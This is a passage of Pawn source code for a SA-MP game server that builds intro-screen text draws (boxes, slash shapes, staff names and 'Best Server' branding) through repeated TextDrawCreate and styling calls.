	IntroText6[29] = TextDrawCreate(-42,321,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[29],0.600000,5.899996); TextDrawAlignment(IntroText6[29],0); TextDrawBackgroundColor(IntroText6[29],0x000000FF); TextDrawFont(IntroText6[29],3); TextDrawUseBox(IntroText6[29],1); TextDrawBoxColor(IntroText6[29],0x000000FF); TextDrawTextSize(IntroText6[29],239.000000,331.000000); TextDrawSetOutline(IntroText6[29],0); TextDrawSetProportional(IntroText6[29],1); TextDrawSetShadow(IntroText6[29],1);
	IntroText6[30] = TextDrawCreate(242,332,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[30],0.449999,5.899996); TextDrawAlignment(IntroText6[30],0); TextDrawBackgroundColor(IntroText6[30],0x000000FF); TextDrawFont(IntroText6[30],3); TextDrawUseBox(IntroText6[30],1); TextDrawBoxColor(IntroText6[30],0x000000FF); TextDrawTextSize(IntroText6[30],309.000000,342.000000); TextDrawSetOutline(IntroText6[30],0); TextDrawSetProportional(IntroText6[30],1); TextDrawSetShadow(IntroText6[30],1);
	IntroText6[31] = TextDrawCreate(257,108,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[31],0.500000,6.399996); TextDrawAlignment(IntroText6[31],0); TextDrawBackgroundColor(IntroText6[31],0x000000FF); TextDrawFont(IntroText6[31],3); TextDrawUseBox(IntroText6[31],1); TextDrawBoxColor(IntroText6[31],0x000000FF); TextDrawTextSize(IntroText6[31],257.000000,118.000000); TextDrawSetOutline(IntroText6[31],0); TextDrawSetProportional(IntroText6[31],1); TextDrawSetShadow(IntroText6[31],1);
	IntroText6[32] = TextDrawCreate(190,140,"~y~Staff"); TextDrawLetterSize(IntroText6[32],0.850000,3.099999); TextDrawAlignment(IntroText6[32],0); TextDrawBackgroundColor(IntroText6[32],0x000000FF); TextDrawFont(IntroText6[32],0); TextDrawUseBox(IntroText6[32],0); TextDrawSetOutline(IntroText6[32],0); TextDrawSetProportional(IntroText6[32],1); TextDrawSetShadow(IntroText6[32],0);
	IntroText6[33] = TextDrawCreate(247,167,"Arman~n~Abolfazl~n~Amir"); TextDrawLetterSize(IntroText6[33],0.500000,2.399999); TextDrawAlignment(IntroText6[33],3); TextDrawBackgroundColor(IntroText6[33],0x658379FF); TextDrawFont(IntroText6[33],1); TextDrawUseBox(IntroText6[33],0); TextDrawSetOutline(IntroText6[33],0); TextDrawSetProportional(IntroText6[33],1); TextDrawSetShadow(IntroText6[33],0);
	IntroText7[0] = TextDrawCreate(248,129,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[0],0.600000,6.099996); TextDrawAlignment(IntroText7[0],0); TextDrawBackgroundColor(IntroText7[0],0x000000FF); TextDrawFont(IntroText7[0],3); TextDrawUseBox(IntroText7[0],1); TextDrawBoxColor(IntroText7[0],0x000000FF); TextDrawTextSize(IntroText7[0],314.000000,146.000000); TextDrawSetOutline(IntroText7[0],0); TextDrawSetProportional(IntroText7[0],1); TextDrawSetShadow(IntroText7[0],1);
	IntroText7[1] = TextDrawCreate(372,128,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[1],0.600000,6.099996); TextDrawAlignment(IntroText7[1],0); TextDrawBackgroundColor(IntroText7[1],0x000000FF); TextDrawFont(IntroText7[1],3); TextDrawUseBox(IntroText7[1],1); TextDrawBoxColor(IntroText7[1],0x000000FF); TextDrawTextSize(IntroText7[1],438.000000,145.000000); TextDrawSetOutline(IntroText7[1],0); TextDrawSetProportional(IntroText7[1],1); TextDrawSetShadow(IntroText7[1],1);
	IntroText7[2] = TextDrawCreate(433,138,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[2],0.600000,6.099996); TextDrawAlignment(IntroText7[2],0); TextDrawBackgroundColor(IntroText7[2],0x000000FF); TextDrawFont(IntroText7[2],3); TextDrawUseBox(IntroText7[2],1); TextDrawBoxColor(IntroText7[2],0x000000FF); TextDrawTextSize(IntroText7[2],499.000000,155.000000); TextDrawSetOutline(IntroText7[2],0); TextDrawSetProportional(IntroText7[2],1); TextDrawSetShadow(IntroText7[2],1);
	IntroText7[3] = TextDrawCreate(305,113,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[3],0.600000,6.699995); TextDrawAlignment(IntroText7[3],0); TextDrawBackgroundColor(IntroText7[3],0x000000FF); TextDrawFont(IntroText7[3],3); TextDrawUseBox(IntroText7[3],1); TextDrawBoxColor(IntroText7[3],0x000000FF); TextDrawTextSize(IntroText7[3],371.000000,130.000000); TextDrawSetOutline(IntroText7[3],0); TextDrawSetProportional(IntroText7[3],1); TextDrawSetShadow(IntroText7[3],1);
	IntroText7[4] = TextDrawCreate(301,265,"~l~/"); TextDrawLetterSize(IntroText7[4],0.700000,12.700012); TextDrawAlignment(IntroText7[4],0); TextDrawBackgroundColor(IntroText7[4],0x000000FF); TextDrawFont(IntroText7[4],3); TextDrawUseBox(IntroText7[4],0); TextDrawSetOutline(IntroText7[4],0); TextDrawSetProportional(IntroText7[4],1); TextDrawSetShadow(IntroText7[4],0);
	IntroText7[5] = TextDrawCreate(372,103,"~l~/"); TextDrawLetterSize(IntroText7[5],0.700000,12.700012); TextDrawAlignment(IntroText7[5],0); TextDrawBackgroundColor(IntroText7[5],0x000000FF); TextDrawFont(IntroText7[5],3); TextDrawUseBox(IntroText7[5],0); TextDrawSetOutline(IntroText7[5],0); TextDrawSetProportional(IntroText7[5],1); TextDrawSetShadow(IntroText7[5],0);
	IntroText7[6] = TextDrawCreate(366,196,"~l~/"); TextDrawLetterSize(IntroText7[6],0.700000,12.700012); TextDrawAlignment(IntroText7[6],0); TextDrawBackgroundColor(IntroText7[6],0x000000FF); TextDrawFont(IntroText7[6],3); TextDrawUseBox(IntroText7[6],0); TextDrawSetOutline(IntroText7[6],0); TextDrawSetProportional(IntroText7[6],1); TextDrawSetShadow(IntroText7[6],0);
	IntroText7[7] = TextDrawCreate(433,108,"~l~/"); TextDrawLetterSize(IntroText7[7],0.700000,12.700012); TextDrawAlignment(IntroText7[7],0); TextDrawBackgroundColor(IntroText7[7],0x000000FF); TextDrawFont(IntroText7[7],3); TextDrawUseBox(IntroText7[7],0); TextDrawSetOutline(IntroText7[7],0); TextDrawSetProportional(IntroText7[7],1); TextDrawSetShadow(IntroText7[7],0);
	IntroText7[8] = TextDrawCreate(428,196,"~l~/"); TextDrawLetterSize(IntroText7[8],0.700000,12.700012); TextDrawAlignment(IntroText7[8],0); TextDrawBackgroundColor(IntroText7[8],0x000000FF); TextDrawFont(IntroText7[8],3); TextDrawUseBox(IntroText7[8],0); TextDrawSetOutline(IntroText7[8],0); TextDrawSetProportional(IntroText7[8],1); TextDrawSetShadow(IntroText7[8],0);
	IntroText7[9] = TextDrawCreate(360,286,"~l~/"); TextDrawLetterSize(IntroText7[9],0.700000,12.700012); TextDrawAlignment(IntroText7[9],0); TextDrawBackgroundColor(IntroText7[9],0x000000FF); TextDrawFont(IntroText7[9],3); TextDrawUseBox(IntroText7[9],0); TextDrawSetOutline(IntroText7[9],0); TextDrawSetProportional(IntroText7[9],1); TextDrawSetShadow(IntroText7[9],0);
	IntroText7[10] = TextDrawCreate(497,107,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[10],0.500000,6.399996); TextDrawAlignment(IntroText7[10],0); TextDrawBackgroundColor(IntroText7[10],0x000000FF); TextDrawFont(IntroText7[10],3); TextDrawUseBox(IntroText7[10],1); TextDrawBoxColor(IntroText7[10],0x000000FF); TextDrawTextSize(IntroText7[10],497.000000,117.000000); TextDrawSetOutline(IntroText7[10],0); TextDrawSetProportional(IntroText7[10],1); TextDrawSetShadow(IntroText7[10],1);
	IntroText7[11] = TextDrawCreate(307,129,"~l~/"); TextDrawLetterSize(IntroText7[11],7.900012,-1.300000); TextDrawAlignment(IntroText7[11],0); TextDrawBackgroundColor(IntroText7[11],0x000000FF); TextDrawFont(IntroText7[11],3); TextDrawUseBox(IntroText7[11],0); TextDrawSetOutline(IntroText7[11],0); TextDrawSetProportional(IntroText7[11],1); TextDrawSetShadow(IntroText7[11],0);
	IntroText7[12] = TextDrawCreate(257,355,"~l~/"); TextDrawLetterSize(IntroText7[12],7.900012,-1.300000); TextDrawAlignment(IntroText7[12],0); TextDrawBackgroundColor(IntroText7[12],0x000000FF); TextDrawFont(IntroText7[12],3); TextDrawUseBox(IntroText7[12],0); TextDrawSetOutline(IntroText7[12],0); TextDrawSetProportional(IntroText7[12],1); TextDrawSetShadow(IntroText7[12],0);
	IntroText7[13] = TextDrawCreate(241,359,"~l~/"); TextDrawLetterSize(IntroText7[13],7.900012,-1.300000); TextDrawAlignment(IntroText7[13],0); TextDrawBackgroundColor(IntroText7[13],0x000000FF); TextDrawFont(IntroText7[13],3); TextDrawUseBox(IntroText7[13],0); TextDrawSetOutline(IntroText7[13],0); TextDrawSetProportional(IntroText7[13],1); TextDrawSetShadow(IntroText7[13],0);
	IntroText7[14] = TextDrawCreate(314,125,"~l~/"); TextDrawLetterSize(IntroText7[14],7.900012,-1.300000); TextDrawAlignment(IntroText7[14],0); TextDrawBackgroundColor(IntroText7[14],0x000000FF); TextDrawFont(IntroText7[14],3); TextDrawUseBox(IntroText7[14],0); TextDrawSetOutline(IntroText7[14],0); TextDrawSetProportional(IntroText7[14],1); TextDrawSetShadow(IntroText7[14],0);
	IntroText7[15] = TextDrawCreate(1,85,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[15],0.750000,7.699995); TextDrawAlignment(IntroText7[15],0); TextDrawBackgroundColor(IntroText7[15],0x000000FF); TextDrawFont(IntroText7[15],3); TextDrawUseBox(IntroText7[15],1); TextDrawBoxColor(IntroText7[15],0x000000FF); TextDrawTextSize(IntroText7[15],254.000000,95.000000); TextDrawSetOutline(IntroText7[15],0); TextDrawSetProportional(IntroText7[15],1); TextDrawSetShadow(IntroText7[15],1);
	IntroText7[16] = TextDrawCreate(498,84,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[16],0.750000,7.699995); TextDrawAlignment(IntroText7[16],0); TextDrawBackgroundColor(IntroText7[16],0x000000FF); TextDrawFont(IntroText7[16],3); TextDrawUseBox(IntroText7[16],1); TextDrawBoxColor(IntroText7[16],0x000000FF); TextDrawTextSize(IntroText7[16],751.000000,94.000000); TextDrawSetOutline(IntroText7[16],0); TextDrawSetProportional(IntroText7[16],1); TextDrawSetShadow(IntroText7[16],1);
	IntroText7[17] = TextDrawCreate(-11,-161,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[17],0.750000,7.699995); TextDrawAlignment(IntroText7[17],0); TextDrawBackgroundColor(IntroText7[17],0x000000FF); TextDrawFont(IntroText7[17],3); TextDrawUseBox(IntroText7[17],1); TextDrawBoxColor(IntroText7[17],0x000000FF); TextDrawTextSize(IntroText7[17],654.000000,-151.000000); TextDrawSetOutline(IntroText7[17],0); TextDrawSetProportional(IntroText7[17],1); TextDrawSetShadow(IntroText7[17],1);
	IntroText7[18] = TextDrawCreate(-1,354,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[18],0.750000,7.699995); TextDrawAlignment(IntroText7[18],0); TextDrawBackgroundColor(IntroText7[18],0x000000FF); TextDrawFont(IntroText7[18],3); TextDrawUseBox(IntroText7[18],1); TextDrawBoxColor(IntroText7[18],0x000000FF); TextDrawTextSize(IntroText7[18],664.000000,364.000000); TextDrawSetOutline(IntroText7[18],0); TextDrawSetProportional(IntroText7[18],1); TextDrawSetShadow(IntroText7[18],1);
	IntroText7[19] = TextDrawCreate(432,170,"~l~/"); TextDrawLetterSize(IntroText7[19],7.900012,-1.300000); TextDrawAlignment(IntroText7[19],0); TextDrawBackgroundColor(IntroText7[19],0x000000FF); TextDrawFont(IntroText7[19],3); TextDrawUseBox(IntroText7[19],0); TextDrawSetOutline(IntroText7[19],0); TextDrawSetProportional(IntroText7[19],1); TextDrawSetShadow(IntroText7[19],0);
	IntroText7[20] = TextDrawCreate(433,164,"~l~/"); TextDrawLetterSize(IntroText7[20],7.900012,-1.300000); TextDrawAlignment(IntroText7[20],0); TextDrawBackgroundColor(IntroText7[20],0x000000FF); TextDrawFont(IntroText7[20],3); TextDrawUseBox(IntroText7[20],0); TextDrawSetOutline(IntroText7[20],0); TextDrawSetProportional(IntroText7[20],1); TextDrawSetShadow(IntroText7[20],0);
	IntroText7[21] = TextDrawCreate(205,321,"_"); TextDrawLetterSize(IntroText7[21],0.500000,3.399998); TextDrawAlignment(IntroText7[21],0); TextDrawBackgroundColor(IntroText7[21],0x000000FF); TextDrawFont(IntroText7[21],3); TextDrawUseBox(IntroText7[21],1); TextDrawBoxColor(IntroText7[21],0x000000FF); TextDrawTextSize(IntroText7[21],305.000000,331.000000); TextDrawSetOutline(IntroText7[21],0); TextDrawSetProportional(IntroText7[21],1); TextDrawSetShadow(IntroText7[21],1);
	IntroText7[22] = TextDrawCreate(215,118,"_"); TextDrawLetterSize(IntroText7[22],0.500000,3.399998); TextDrawAlignment(IntroText7[22],0); TextDrawBackgroundColor(IntroText7[22],0x000000FF); TextDrawFont(IntroText7[22],3); TextDrawUseBox(IntroText7[22],1); TextDrawBoxColor(IntroText7[22],0x000000FF); TextDrawTextSize(IntroText7[22],315.000000,128.000000); TextDrawSetOutline(IntroText7[22],0); TextDrawSetProportional(IntroText7[22],1); TextDrawSetShadow(IntroText7[22],1);
	IntroText7[23] = TextDrawCreate(382,111,"_"); TextDrawLetterSize(IntroText7[23],0.500000,3.399998); TextDrawAlignment(IntroText7[23],0); TextDrawBackgroundColor(IntroText7[23],0x000000FF); TextDrawFont(IntroText7[23],3); TextDrawUseBox(IntroText7[23],1); TextDrawBoxColor(IntroText7[23],0x000000FF); TextDrawTextSize(IntroText7[23],443.000000,121.000000); TextDrawSetOutline(IntroText7[23],0); TextDrawSetProportional(IntroText7[23],1); TextDrawSetShadow(IntroText7[23],1);
	IntroText7[24] = TextDrawCreate(443,116,"_"); TextDrawLetterSize(IntroText7[24],0.600000,4.599997); TextDrawAlignment(IntroText7[24],0); TextDrawBackgroundColor(IntroText7[24],0x000000FF); TextDrawFont(IntroText7[24],3); TextDrawUseBox(IntroText7[24],1); TextDrawBoxColor(IntroText7[24],0x000000FF); TextDrawTextSize(IntroText7[24],504.000000,133.000000); TextDrawSetOutline(IntroText7[24],0); TextDrawSetProportional(IntroText7[24],1); TextDrawSetShadow(IntroText7[24],1);
	IntroText7[25] = TextDrawCreate(369,315,"_"); TextDrawLetterSize(IntroText7[25],0.600000,4.599997); TextDrawAlignment(IntroText7[25],0); TextDrawBackgroundColor(IntroText7[25],0x000000FF); TextDrawFont(IntroText7[25],3); TextDrawUseBox(IntroText7[25],1); TextDrawBoxColor(IntroText7[25],0x000000FF); TextDrawTextSize(IntroText7[25],430.000000,332.000000); TextDrawSetOutline(IntroText7[25],0); TextDrawSetProportional(IntroText7[25],1); TextDrawSetShadow(IntroText7[25],1);
	IntroText7[26] = TextDrawCreate(432,296,"_"); TextDrawLetterSize(IntroText7[26],0.600000,6.099996); TextDrawAlignment(IntroText7[26],0); TextDrawBackgroundColor(IntroText7[26],0x000000FF); TextDrawFont(IntroText7[26],3); TextDrawUseBox(IntroText7[26],1); TextDrawBoxColor(IntroText7[26],0x000000FF); TextDrawTextSize(IntroText7[26],498.000000,313.000000); TextDrawSetOutline(IntroText7[26],0); TextDrawSetProportional(IntroText7[26],1); TextDrawSetShadow(IntroText7[26],1);
	IntroText7[27] = TextDrawCreate(-42,321,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[27],0.600000,5.899996); TextDrawAlignment(IntroText7[27],0); TextDrawBackgroundColor(IntroText7[27],0x000000FF); TextDrawFont(IntroText7[27],3); TextDrawUseBox(IntroText7[27],1); TextDrawBoxColor(IntroText7[27],0x000000FF); TextDrawTextSize(IntroText7[27],239.000000,331.000000); TextDrawSetOutline(IntroText7[27],0); TextDrawSetProportional(IntroText7[27],1); TextDrawSetShadow(IntroText7[27],1);
	IntroText7[28] = TextDrawCreate(242,332,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[28],0.449999,5.899996); TextDrawAlignment(IntroText7[28],0); TextDrawBackgroundColor(IntroText7[28],0x000000FF); TextDrawFont(IntroText7[28],3); TextDrawUseBox(IntroText7[28],1); TextDrawBoxColor(IntroText7[28],0x000000FF); TextDrawTextSize(IntroText7[28],309.000000,342.000000); TextDrawSetOutline(IntroText7[28],0); TextDrawSetProportional(IntroText7[28],1); TextDrawSetShadow(IntroText7[28],1);
	IntroText7[29] = TextDrawCreate(306,182,"~l~/"); TextDrawLetterSize(IntroText7[29],0.700000,12.700012); TextDrawAlignment(IntroText7[29],0); TextDrawBackgroundColor(IntroText7[29],0x000000FF); TextDrawFont(IntroText7[29],3); TextDrawUseBox(IntroText7[29],0); TextDrawSetOutline(IntroText7[29],0); TextDrawSetProportional(IntroText7[29],1); TextDrawSetShadow(IntroText7[29],0);
	IntroText7[30] = TextDrawCreate(311,91,"~l~/"); TextDrawLetterSize(IntroText7[30],0.700000,12.700012); TextDrawAlignment(IntroText7[30],0); TextDrawBackgroundColor(IntroText7[30],0x000000FF); TextDrawFont(IntroText7[30],3); TextDrawUseBox(IntroText7[30],0); TextDrawSetOutline(IntroText7[30],0); TextDrawSetProportional(IntroText7[30],1); TextDrawSetShadow(IntroText7[30],0);
	IntroText7[31] = TextDrawCreate(257,108,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText7[31],0.500000,6.399996); TextDrawAlignment(IntroText7[31],0); TextDrawBackgroundColor(IntroText7[31],0x000000FF); TextDrawFont(IntroText7[31],3); TextDrawUseBox(IntroText7[31],1); TextDrawBoxColor(IntroText7[31],0x000000FF); TextDrawTextSize(IntroText7[31],257.000000,118.000000); TextDrawSetOutline(IntroText7[31],0); TextDrawSetProportional(IntroText7[31],1); TextDrawSetShadow(IntroText7[31],1);
	IntroText7[32] = TextDrawCreate(371,313,"~n~Best Server"); TextDrawLetterSize(IntroText7[32],0.500000,2.399999); TextDrawAlignment(IntroText7[32],0); TextDrawBackgroundColor(IntroText7[32],0x658379FF); TextDrawFont(IntroText7[32],1); TextDrawUseBox(IntroText7[32],0); TextDrawSetOutline(IntroText7[32],0); TextDrawSetProportional(IntroText7[32],1); TextDrawSetShadow(IntroText7[32],0);
	IntroText7[33] = TextDrawCreate(369,282,"~n~~y~Samp"); TextDrawLetterSize(IntroText7[33],0.850000,3.099999); TextDrawAlignment(IntroText7[33],0); TextDrawBackgroundColor(IntroText7[33],0x000000FF); TextDrawFont(IntroText7[33],0); TextDrawUseBox(IntroText7[33],0); TextDrawSetOutline(IntroText7[33],0); TextDrawSetProportional(IntroText7[33],1); TextDrawSetShadow(IntroText7[33],0);
	IntroText8[0] = TextDrawCreate(231,96,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[0],0.399999,5.399997); TextDrawAlignment(IntroText8[0],0); TextDrawBackgroundColor(IntroText8[0],0x000000FF); TextDrawFont(IntroText8[0],3); TextDrawUseBox(IntroText8[0],1); TextDrawBoxColor(IntroText8[0],0x000000FF); TextDrawTextSize(IntroText8[0],299.000000,106.000000); TextDrawSetOutline(IntroText8[0],0); TextDrawSetProportional(IntroText8[0],1); TextDrawSetShadow(IntroText8[0],1);
	IntroText8[1] = TextDrawCreate(414,107,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[1],0.399999,5.399997); TextDrawAlignment(IntroText8[1],0); TextDrawBackgroundColor(IntroText8[1],0x000000FF); TextDrawFont(IntroText8[1],3); TextDrawUseBox(IntroText8[1],1); TextDrawBoxColor(IntroText8[1],0x000000FF); TextDrawTextSize(IntroText8[1],482.000000,117.000000); TextDrawSetOutline(IntroText8[1],0); TextDrawSetProportional(IntroText8[1],1); TextDrawSetShadow(IntroText8[1],1);
	IntroText8[2] = TextDrawCreate(354,118,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[2],0.399999,5.399997); TextDrawAlignment(IntroText8[2],0); TextDrawBackgroundColor(IntroText8[2],0x000000FF); TextDrawFont(IntroText8[2],3); TextDrawUseBox(IntroText8[2],1); TextDrawBoxColor(IntroText8[2],0x000000FF); TextDrawTextSize(IntroText8[2],422.000000,128.000000); TextDrawSetOutline(IntroText8[2],0); TextDrawSetProportional(IntroText8[2],1); TextDrawSetShadow(IntroText8[2],1);
	IntroText8[3] = TextDrawCreate(288,128,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[3],0.399999,5.399997); TextDrawAlignment(IntroText8[3],0); TextDrawBackgroundColor(IntroText8[3],0x000000FF); TextDrawFont(IntroText8[3],3); TextDrawUseBox(IntroText8[3],1); TextDrawBoxColor(IntroText8[3],0x000000FF); TextDrawTextSize(IntroText8[3],356.000000,138.000000); TextDrawSetOutline(IntroText8[3],0); TextDrawSetProportional(IntroText8[3],1); TextDrawSetShadow(IntroText8[3],1);
	IntroText8[4] = TextDrawCreate(294,104,"~l~/"); TextDrawLetterSize(IntroText8[4],0.750000,12.600011); TextDrawAlignment(IntroText8[4],0); TextDrawBackgroundColor(IntroText8[4],0x000000FF); TextDrawFont(IntroText8[4],3); TextDrawUseBox(IntroText8[4],0); TextDrawSetOutline(IntroText8[4],0); TextDrawSetProportional(IntroText8[4],1); TextDrawSetShadow(IntroText8[4],0);
	IntroText8[5] = TextDrawCreate(288,195,"~l~/"); TextDrawLetterSize(IntroText8[5],0.750000,13.800016); TextDrawAlignment(IntroText8[5],0); TextDrawBackgroundColor(IntroText8[5],0x000000FF); TextDrawFont(IntroText8[5],3); TextDrawUseBox(IntroText8[5],0); TextDrawSetOutline(IntroText8[5],0); TextDrawSetProportional(IntroText8[5],1); TextDrawSetShadow(IntroText8[5],0);
	IntroText8[6] = TextDrawCreate(408,201,"~l~/"); TextDrawLetterSize(IntroText8[6],0.750000,13.800016); TextDrawAlignment(IntroText8[6],0); TextDrawBackgroundColor(IntroText8[6],0x000000FF); TextDrawFont(IntroText8[6],3); TextDrawUseBox(IntroText8[6],0); TextDrawSetOutline(IntroText8[6],0); TextDrawSetProportional(IntroText8[6],1); TextDrawSetShadow(IntroText8[6],0);
	IntroText8[7] = TextDrawCreate(414,99,"~l~/"); TextDrawLetterSize(IntroText8[7],0.750000,13.800016); TextDrawAlignment(IntroText8[7],0); TextDrawBackgroundColor(IntroText8[7],0x000000FF); TextDrawFont(IntroText8[7],3); TextDrawUseBox(IntroText8[7],0); TextDrawSetOutline(IntroText8[7],0); TextDrawSetProportional(IntroText8[7],1); TextDrawSetShadow(IntroText8[7],0);
	IntroText8[8] = TextDrawCreate(348,243,"~l~/"); TextDrawLetterSize(IntroText8[8],0.800000,-12.500011); TextDrawAlignment(IntroText8[8],0); TextDrawBackgroundColor(IntroText8[8],0x000000FF); TextDrawFont(IntroText8[8],3); TextDrawUseBox(IntroText8[8],0); TextDrawSetOutline(IntroText8[8],0); TextDrawSetProportional(IntroText8[8],1); TextDrawSetShadow(IntroText8[8],0);
	IntroText8[9] = TextDrawCreate(354,334,"~l~/"); TextDrawLetterSize(IntroText8[9],0.800000,-12.500011); TextDrawAlignment(IntroText8[9],0); TextDrawBackgroundColor(IntroText8[9],0x000000FF); TextDrawFont(IntroText8[9],3); TextDrawUseBox(IntroText8[9],0); TextDrawSetOutline(IntroText8[9],0); TextDrawSetProportional(IntroText8[9],1); TextDrawSetShadow(IntroText8[9],0);
	IntroText8[10] = TextDrawCreate(359,411,"~l~/"); TextDrawLetterSize(IntroText8[10],0.800000,-12.500011); TextDrawAlignment(IntroText8[10],0); TextDrawBackgroundColor(IntroText8[10],0x000000FF); TextDrawFont(IntroText8[10],3); TextDrawUseBox(IntroText8[10],0); TextDrawSetOutline(IntroText8[10],0); TextDrawSetProportional(IntroText8[10],1); TextDrawSetShadow(IntroText8[10],0);
	IntroText8[11] = TextDrawCreate(211,133,"~l~/"); TextDrawLetterSize(IntroText8[11],6.550006,1.000000); TextDrawAlignment(IntroText8[11],0); TextDrawBackgroundColor(IntroText8[11],0x000000FF); TextDrawFont(IntroText8[11],3); TextDrawUseBox(IntroText8[11],0); TextDrawSetOutline(IntroText8[11],0); TextDrawSetProportional(IntroText8[11],1); TextDrawSetShadow(IntroText8[11],0);
	IntroText8[12] = TextDrawCreate(199,131,"~l~/"); TextDrawLetterSize(IntroText8[12],6.550006,1.000000); TextDrawAlignment(IntroText8[12],0); TextDrawBackgroundColor(IntroText8[12],0x000000FF); TextDrawFont(IntroText8[12],3); TextDrawUseBox(IntroText8[12],0); TextDrawSetOutline(IntroText8[12],0); TextDrawSetProportional(IntroText8[12],1); TextDrawSetShadow(IntroText8[12],0);
	IntroText8[13] = TextDrawCreate(350,324,"~l~/"); TextDrawLetterSize(IntroText8[13],6.550006,1.000000); TextDrawAlignment(IntroText8[13],0); TextDrawBackgroundColor(IntroText8[13],0x000000FF); TextDrawFont(IntroText8[13],3); TextDrawUseBox(IntroText8[13],0); TextDrawSetOutline(IntroText8[13],0); TextDrawSetProportional(IntroText8[13],1); TextDrawSetShadow(IntroText8[13],0);
	IntroText8[14] = TextDrawCreate(360,328,"~l~/"); TextDrawLetterSize(IntroText8[14],6.550006,1.000000); TextDrawAlignment(IntroText8[14],0); TextDrawBackgroundColor(IntroText8[14],0x000000FF); TextDrawFont(IntroText8[14],3); TextDrawUseBox(IntroText8[14],0); TextDrawSetOutline(IntroText8[14],0); TextDrawSetProportional(IntroText8[14],1); TextDrawSetShadow(IntroText8[14],0);
	IntroText8[15] = TextDrawCreate(473,101,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[15],0.399999,5.899996); TextDrawAlignment(IntroText8[15],0); TextDrawBackgroundColor(IntroText8[15],0x000000FF); TextDrawFont(IntroText8[15],3); TextDrawUseBox(IntroText8[15],1); TextDrawBoxColor(IntroText8[15],0x000000FF); TextDrawTextSize(IntroText8[15],708.000000,111.000000); TextDrawSetOutline(IntroText8[15],0); TextDrawSetProportional(IntroText8[15],1); TextDrawSetShadow(IntroText8[15],1);
	IntroText8[16] = TextDrawCreate(-7,-131,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[16],0.399999,5.899996); TextDrawAlignment(IntroText8[16],0); TextDrawBackgroundColor(IntroText8[16],0x000000FF); TextDrawFont(IntroText8[16],3); TextDrawUseBox(IntroText8[16],1); TextDrawBoxColor(IntroText8[16],0x000000FF); TextDrawTextSize(IntroText8[16],303.000000,-121.000000); TextDrawSetOutline(IntroText8[16],0); TextDrawSetProportional(IntroText8[16],1); TextDrawSetShadow(IntroText8[16],1);
	IntroText8[17] = TextDrawCreate(241,-142,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[17],0.399999,5.899996); TextDrawAlignment(IntroText8[17],0); TextDrawBackgroundColor(IntroText8[17],0x000000FF); TextDrawFont(IntroText8[17],3); TextDrawUseBox(IntroText8[17],1); TextDrawBoxColor(IntroText8[17],0x000000FF); TextDrawTextSize(IntroText8[17],642.000000,-132.000000); TextDrawSetOutline(IntroText8[17],0); TextDrawSetProportional(IntroText8[17],1); TextDrawSetShadow(IntroText8[17],1);
	IntroText8[18] = TextDrawCreate(-33,348,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[18],0.399999,5.899996); TextDrawAlignment(IntroText8[18],0); TextDrawBackgroundColor(IntroText8[18],0x000000FF); TextDrawFont(IntroText8[18],3); TextDrawUseBox(IntroText8[18],1); TextDrawBoxColor(IntroText8[18],0x000000FF); TextDrawTextSize(IntroText8[18],646.000000,358.000000); TextDrawSetOutline(IntroText8[18],0); TextDrawSetProportional(IntroText8[18],1); TextDrawSetShadow(IntroText8[18],1);
	IntroText8[19] = TextDrawCreate(223,313,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[19],0.399999,5.899996); TextDrawAlignment(IntroText8[19],0); TextDrawBackgroundColor(IntroText8[19],0x000000FF); TextDrawFont(IntroText8[19],3); TextDrawUseBox(IntroText8[19],1); TextDrawBoxColor(IntroText8[19],0x000000FF); TextDrawTextSize(IntroText8[19],289.000000,323.000000); TextDrawSetOutline(IntroText8[19],0); TextDrawSetProportional(IntroText8[19],1); TextDrawSetShadow(IntroText8[19],1);
	IntroText8[20] = TextDrawCreate(368,333,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[20],0.399999,5.899996); TextDrawAlignment(IntroText8[20],0); TextDrawBackgroundColor(IntroText8[20],0x000000FF); TextDrawFont(IntroText8[20],3); TextDrawUseBox(IntroText8[20],1); TextDrawBoxColor(IntroText8[20],0x000000FF); TextDrawTextSize(IntroText8[20],434.000000,343.000000); TextDrawSetOutline(IntroText8[20],0); TextDrawSetProportional(IntroText8[20],1); TextDrawSetShadow(IntroText8[20],1);
	IntroText8[21] = TextDrawCreate(412,316,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText8[21],0.399999,5.899996); TextDrawAlignment(IntroText8[21],0); TextDrawBackgroundColor(IntroText8[21],0x000000FF); TextDrawFont(IntroText8[21],3); TextDrawUseBox(IntroText8[21],1); TextDrawBoxColor(IntroText8[21],0x000000FF); TextDrawTextSize(IntroText8[21],478.000000,326.000000); TextDrawSetOutline(IntroText8[21],0); TextDrawSetProportional(IntroText8[21],1); TextDrawSetShadow(IntroText8[21],1);
